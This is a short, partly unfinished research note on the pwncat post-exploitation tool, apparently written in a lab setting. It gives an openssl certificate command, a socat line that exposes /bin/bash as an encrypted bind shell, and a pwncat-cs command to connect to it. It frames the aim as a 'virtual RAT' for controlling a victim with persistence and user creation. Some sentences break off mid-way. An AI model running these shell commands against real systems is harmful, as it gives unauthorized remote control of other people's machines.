# pwncat
This folder holds information about the pwncat platform. This was hinted by a 
customer and I determined it was useful for this platform as well. 

The first thing that tripped me up is the conflict of names between the 
following projects

* https://github.com/calebstewart/pwncat
* https://github.com/cytopia/pwncat/tree/master

Other websites and pages seem to indicate that the first link (previous) is
actually a fork of the second. If you visit either of these sites you will
see that neither project has recieved an update in at least three (3) years.

I will focus most of my research on the first project from GitHub and not the
second. 

## Command Line
To connect to a target running a bind shell listener from SOCAT you can use 
the following command line syntax once pwncat-cs is installed:

    pwncat-cs --ssl 10.0.0.148 4444

It is importat 

## Installation
The very first thing I had to accomplish is the 

## SSL Key
    openssl req -x509 -newkey rsa:2048 -nodes -keyout private.key -out certificate.crt -days 365 -subj "/CN=ubuntu22srv"

# SOCAT
I chose to use socat as a slightly more than moderate example of a bind shell.
This is primarily due to the testing environment where I performed this 
research as I sit behind multiple hops which won't allow a target to connect
back to a developer workstation.

## Installing
To install SOCAT on an Ubuntu development workstation you can do the following:

    sudo apt update && sudo apt install -y socat

## Invocation
To start socat, you can use the following syntax:

    socat OPENSSL-LISTEN:4444,reuseaddr,cert=cert.pem,key=key.pem,verify=0,fork EXEC:/bin/bash,pty,stderr,setsid,sigint,sane & 

Note, this assumes the encryption key and certificate are in the same directory 
as where you invoke socat.

## Virtual RAT
A phrase that was used to describe pwncat to me was **virtual rat**. The 
principal reason for performing this research was to determine if this is 
possible. To interpret this in my own words, I am trying to determine if I can
create a stand-alone product (pwncat-cs) that can hide details about connecting
to a remote asset (victim) and present a Python interface to me from the same 
machine where I can write Python to actually send commands to/from a target 
in addition to retrieving files, gaining persistence and even adding user(s).

Example python found in this directory deals with a programmatic interface to
a pwncat instance for the purposes of controlling a remote target through
pwncat but from Python script(s).

# URLs
* https://pwncat.readthedocs.io/en/v0.3.1/api/victim.html#